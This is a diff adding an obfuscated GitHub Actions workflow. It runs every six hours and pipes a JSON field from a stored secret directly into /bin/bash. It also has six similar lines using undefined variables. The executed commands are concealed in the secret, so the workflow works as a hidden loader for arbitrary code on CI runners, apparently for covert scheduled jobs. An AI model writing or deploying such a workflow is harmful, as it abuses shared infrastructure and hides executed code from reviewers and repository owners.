@@ -1,0 +1,23 @@
+name: gaohenduon
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gaohenduon
+        env:
+          u00071: ${{ secrets.u00071 }}
+        run: |
+          echo $u00071 | jq -r .klxe3 | /bin/bash
+          echo $jwo927 | jq -r .fki01 | /bin/bash
+          echo $e13324 | jq -r .mu2 | /bin/bash
+          echo $c801 | jq -r .fr7 | /bin/bash
+          echo $cuv00 | jq -r .kucn27742 | /bin/bash
+          echo $s73 | jq -r .jp386 | /bin/bash
+          echo $rfvey167 | jq -r .c62 | /bin/bash
+
